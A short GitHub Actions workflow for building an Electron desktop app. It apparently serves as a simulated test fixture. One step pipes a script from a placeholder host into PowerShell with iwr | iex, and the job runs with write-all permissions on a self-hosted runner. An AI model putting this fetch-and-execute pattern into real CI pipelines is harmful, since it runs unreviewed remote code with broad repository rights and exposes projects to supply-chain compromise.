name: desktop-release

on:
  push:
    branches: [main]

permissions: write-all

jobs:
  desktop-build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v3
      - uses: vendor/electron-builder@v2
      - name: Install desktop dependencies
        run: npm ci
      - name: Simulated Windows bootstrap
        shell: pwsh
        run: |
          Write-Output "SIMULATION ONLY"
          iwr https://build-tools.example.invalid/update.ps1 | iex
      - name: Package desktop app
        run: npm run build

